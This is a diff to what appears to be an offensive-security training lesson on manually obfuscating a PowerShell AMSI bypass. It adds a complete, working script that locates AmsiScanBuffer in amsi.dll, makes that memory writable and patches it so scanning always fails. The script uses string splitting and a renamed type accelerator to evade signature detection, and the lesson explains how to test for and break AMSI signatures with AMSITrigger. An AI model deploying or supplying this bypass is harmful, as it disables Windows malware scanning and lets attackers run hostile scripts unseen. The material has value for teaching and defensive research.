@@ -2,6 +2,8 @@ Now that we have a partially working bypass, we need to obfuscate the code to by
 
 To begin our obfuscation journey, we will start with manual obfuscation along with signature checking scripts. In the next task, we will cover automated obfuscators like Invoke-Obfuscation and ISE-Steroids. The manual route is far more reliable compared to automated obfuscators as you are checking and tampering with each signature within your sample, in this case, an AMSI bypass.
 
+## Obfuscating AMSI bypass code
+
 Generally, AMSI is only looking for weak strings for AMSI bypasses such as `AmsiScanBuffer`, `amsiInitFailed`, `AmsiUtils`, etc. This is where string concatenation can come into play and aid in breaking these string signatures. As EDR solutions and products progress, these signatures and methods may become more robust. Still, these identical signatures have been prevalent for a reasonable amount of time and aren't expected to be changing any time soon for non-commercial products.  
 
 To aid in our obfuscation efforts, we will use the `AMSITrigger` script, [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger), written by RythmStick. This script will take a given PowerShell script and each unique string within it against AMSI to identify what strings are being used to flag the script as malicious. This will only test against AMSI and <u>not Defender</u>; we will go over obfuscating for Defender in a later task; however, for this task, we only need to worry about AMSI since everything is file-less (mostly).
@@ -66,6 +68,34 @@ New: `[dorkstork]::copy($buf, 0, $BufferAddress, 6);`
 Now we have a newly created type accelerator that will break the signature attached to it.  
 
 For more information about creating type accelerators within PowerShell, check out this blog, [https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell)
+
+### Obfuscated **amsi_bypass.ps1**
+
+```csharp
+$MethodDefinition = "
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+";
+
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+$ABSD = 'AmsiS'+'canBuffer';
+$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
+[UInt32]$Size = 0x5;
+[UInt32]$ProtectFlag = 0x40;
+[UInt32]$OldProtectFlag = 0;
+[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
+$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
+[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('d1kst1k', [system.runtime.interopservices.marshal])
+[d1kst1k]::copy($buf, 0, $BufferAddress, 6);4
+```
 
 
 To entirely obfuscate our code and ensure our bypass works, we can combine the two techniques shown. In addition, you can rerun AMSITrigger as needed to help identify broken signatures and other signatures not yet broken.  
